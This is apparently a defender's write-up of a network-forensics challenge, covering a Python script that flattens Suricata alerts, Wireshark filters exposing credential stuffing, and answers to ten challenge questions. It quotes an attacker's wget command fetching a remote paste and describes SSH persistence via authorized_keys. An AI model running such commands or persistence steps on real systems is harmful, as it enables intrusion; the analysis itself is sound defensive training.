First, ran this python script to parse out the JSON alerts file. Then began reading them with timeline explorer.

```python
import json
import csv

with open(r"C:\Users\bako\Desktop\MeerKat\meerkat-alerts.json", "r", encoding="utf-8") as f:
     data = json.load(f)

rows = []
for x in data:
    if x.get("event_type") != "alert":
        continue

    alert = x.get("alert", {})
    rows.append({
        "ts": x.get("ts"),
        "src_ip": x.get("src_ip"),
        "src_port": x.get("src_port"),
        "dest_ip": x.get("dest_ip"),
        "dest_port": x.get("dest_port"),
        "proto": x.get("proto"),
        "app_proto": x.get("app_proto"),
        "severity": alert.get("severity"),
        "signature": alert.get("signature"),
        "category": alert.get("category"),
        "action": alert.get("action"),
        "signature_id": alert.get("signature_id"),
    })

with open("alerts_flat.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=rows[0].keys())
    writer.writeheader()
    writer.writerows(rows)

print(f"Wrote {len(rows)} rows to alerts_flat.csv")
```

Immediately I found a trailhead which pointed me towards question 1. 

Question #1, 3 - Found in the parsed alerts file. 
![[Pasted image 20260419183155.png]]

Question #2, 5, 6 - Within the alert, I noticed the traffic type is http. I opened up the pcap file to and used this broad initial filter. 

```Wireshark
http
```

Clicking through I found multiple post requests submitting a form with a username and password. I then filtered like this to find additional logins. Additionally, I added the values of the form to the columns for easier viewing. 

```Wireshark
http.request.method == "POST" && http contains "username" 
```

This is ***credential stuffing***. The attacker is trying a bunch of username:password pairs. Not targeting one particular password or user account. Using the amount of results retunred by the additional filter below, we can then discover the amount of pairs attempted:
```Wireshark
http.request.method == "POST" && http contains "username" && !(http contains "install")
```

The last user attempt is successful. It also does not return a 401 access to resources denied error like others do. 

Question #4 - researched the vuln to discover the string that must be used. The string is also observed in the http traffic streams. 

Question #7 - Looking at http traffic, the user runs this command: 
```Bash
wget https://pastes.io/raw/bx5gcr0et8
```
from that we use the domain as the answer

Question #8 - This one I had to use the hint. Go to interent archive and retrieve snapshots of the pastebin. It references another pastebin. Use the file in the url. 

Question #9 - The attacker modifies `/home/ubuntu/.ssh/authorized_keys` to create an ssh persistence, 

Question #10 - Searched the mitre homepage and found https://attack.mitre.org/techniques/T1098/004/

